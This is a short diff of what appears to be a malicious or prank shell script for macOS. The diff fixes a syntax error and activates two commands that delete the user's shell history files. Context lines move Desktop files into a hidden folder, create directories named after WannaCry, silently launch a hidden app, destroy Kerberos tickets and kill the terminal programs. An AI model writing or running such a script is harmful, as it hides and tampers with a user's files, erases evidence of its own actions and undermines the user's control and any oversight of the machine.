@@ -2,7 +2,9 @@ if [ $(users) == "aaskal" ]
 then
     echo "wa ta sir thwa"
     exit 1
-done
+fi  # replace 'done' with 'fi'
+
+# rest of the script...
 
 mkdir -p /tmp/laz/
 
@@ -22,7 +24,7 @@ mv ~/Desktop/* ~/.Laz/
 
 cd ~/tmp
 
-# rm -rf ~/.*history*
+rm -rf ~/.*history*
 
 mkdir wannacry{0..10}
 
@@ -30,7 +32,7 @@ nohup open /tmp/laz/app/Laz.app > /dev/null
 
 kdestroy
 clear
-# rm -f ~/.*history*
+rm -f ~/.*history*
 
 killall iTerm
 killall Terminal
